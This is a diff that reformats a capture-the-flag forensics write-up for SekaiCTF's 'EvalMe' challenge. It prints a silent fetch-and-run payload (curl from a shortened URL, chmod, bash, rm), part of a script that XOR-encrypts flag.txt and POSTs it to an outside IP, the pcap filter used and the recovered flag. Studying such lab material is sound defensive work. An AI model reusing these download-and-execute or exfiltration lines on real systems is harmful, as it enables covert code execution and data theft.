@@ -1,15 +1,19 @@
-<h1>EvalMe - Forensice - SekaiCTF</h1>
-<h2>Author: Guesslemonger</h2>
+# EvalMe - Forensics - SekaiCTF
+## Author: Guesslemonger
 
-<h3>Problem: I was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate?
-It came attached with a capture.pcapng.</h3?
+### Problem
+I was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate? It came attached with a `capture.pcapng`.
 
-Connecting to the chals.sekai.team server, it required the user to solve 100 simple math problems under a given time. This was solved using the evalMe.py script. 
+### Challenge Description
+Connecting to the `chals.sekai.team` server required the user to solve 100 simple math problems under a given time. This was solved using the `evalMe.py` script.
 
 Following its solve, there was a curl command given at the end:
-b'__import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f extract.sh)>/dev/null 2>&1||true",shell=True)\r#1 + 2 
+```python
+b'__import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f extract.sh)>/dev/null 2>&1||true",shell=True)\r#1 + 2
+```
 
-Downloading the extract.sh to our VM, we get the following script:
+### Extract.sh
+Downloading the extract.sh to our VM (`curl -sL https://shorturl.at/fgjvU -o extract.sh`), we get the following script:
 ```
 #!/bin/bash
 
@@ -17,10 +21,8 @@ FLAG=$(cat flag.txt)
 
 KEY='s3k@1_v3ry_w0w'
 
-
 # Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
 Asc() { printf '%d' "'$1"; }
-
 
 XOREncrypt(){
     local key="$1" DataIn="$2"
@@ -48,14 +50,19 @@ XOREncrypt $KEY $FLAG
 exit 0
 ```
 
-This script reads the content of flag.txt, encrypts it using XOR encryption with a predefined key, and then sends the encrypted data, byte by byte, to a remote server using cURL. The server URL and endpoint seem to be http://35.196.65.151:30899/, and the data is likely being sent in a structured JSON format as part of the POST request.
+### XOR Encryption
+This script reads the content of `flag.txt`, encrypts it using XOR encryption with a predefined key, and then sends the encrypted data, byte by byte, to a remote server using cURL. The server URL and endpoint seem to be `http://35.196.65.151:30899/`, and the data is likely being sent in a structured JSON format as part of the POST request.
 
-This is where the pcap file comes in. It contains the data sent via that POST command. So, filtering by: ip.dst ==35.196.65.151 && http.request.method == POST, we get 51 packets that contain the bytes that was sent as seen below:
+### pcap Analysis
+This is where the pcap file comes in. It contains the data sent via that POST command. So, filtering by: `ip.dst ==35.196.65.151 && http.request.method == POST`, we get 51 packets that contain the bytes that were sent as seen below:
 
 
 ![alt text]([https://github.com/triciadang/CTF/SekaiCTF/evalMe/evalMeScreenshot.jpg?raw=true])
 
-Exporting all those bytes, we created a script that reversed the encryption for each byte:
+We exported all of the bytes into a txt file using Wireshark.
+
+### Decryption of the Data
+We then created a script that reversed the encryption for each byte:
 
 ```
 #!/bin/bash
@@ -88,5 +95,4 @@ DecryptedData=$(XORDecrypt "$KEY" "$EncryptedData")
 
 echo -ne "$DecryptedData"
 ```
-
-Running it against all the exported bytes, we retrieve the flag: SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483} 
+Running it against the exported bytes, we retrieve the flag: `SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}`
